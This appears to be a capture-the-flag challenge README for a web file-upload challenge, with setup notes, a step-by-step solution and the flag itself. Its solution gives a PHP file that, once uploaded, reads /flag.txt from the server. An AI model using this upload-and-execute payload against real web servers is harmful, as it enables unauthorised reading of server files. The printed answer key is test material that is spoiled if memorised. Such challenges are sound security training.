# Web 1 CTF Challenge:

## Title: Unrestricted Power
## TESTED
## Created By: S1n1st3r

## NOTES

On startup you will need to exec in and run crond

    docker exec <container> '/var/www/entrypoint.sh'

Runs locally on port 32773

### Points: 100

### Description:

You have discovered an unrestricted file upload vulnerability on a web server. Your goal is to use this vulnerability to read the flag from the web server.

### Instructions:

    Visit the web server at http://www.example.com/forum.php
    Upload a file with the following contents:

<?php
$file = fopen("/flag.txt", "r");
$flag = fread($file, filesize("/flag.txt"));
echo $flag;
?>

Visit the uploaded file at http://www.example.com/uploads/<your_uploaded_file>.php

The flag will be displayed on the page.

flag.txt:

    SummitCTF{R3str1ct_y0u5_Upl0d3s}
